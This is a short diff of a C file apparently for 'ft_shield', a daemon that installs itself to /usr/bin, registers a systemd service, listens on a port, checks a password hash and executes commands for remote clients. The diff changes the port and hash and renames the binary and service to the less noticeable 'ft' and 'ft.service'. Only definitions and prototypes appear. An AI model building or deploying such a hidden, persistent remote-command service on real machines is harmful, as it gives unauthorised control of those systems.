@@ -10,19 +10,19 @@
 #include <errno.h>
 #include <fcntl.h>
 
-#define PORT 4242
+#define PORT 2032
 #define BUFFER_SIZE 1024
 #define MAX_CLIENTS 3
-#define AUTH_PASSWORD_HASH "8fb9f8fd"
+#define AUTH_PASSWORD_HASH "bc29d1bc"//"8fb9f8fd"
 #define SECRET_KEY 54
 #define SOURCE_FILE "src/ft_shield"
-#define DEST_FILE "/usr/bin/ft_shield"
-#define SERVICE_NAME "ft_shield.service"
+#define DEST_FILE "/usr/bin/ft"
+#define SERVICE_NAME "ft.service"
 
 int create_server_socket();
 void bind_and_listen(int server_fd, struct sockaddr_in* address);
 int handle_new_connection(int server_fd, struct sockaddr_in* address, int *client_socket, int addrlen);
-void handle_client_data(int socket_id, char *buffer, struct sockaddr_in* address, int addrlen);
+void handle_client_data(int *client_socket, int socket_id, char *buffer, struct sockaddr_in* address, int addrlen);
 void execute_command(const char* command, int client_socket);
 int authenticate_client(int client_socket);
 void hash(const char *password, char *hash);
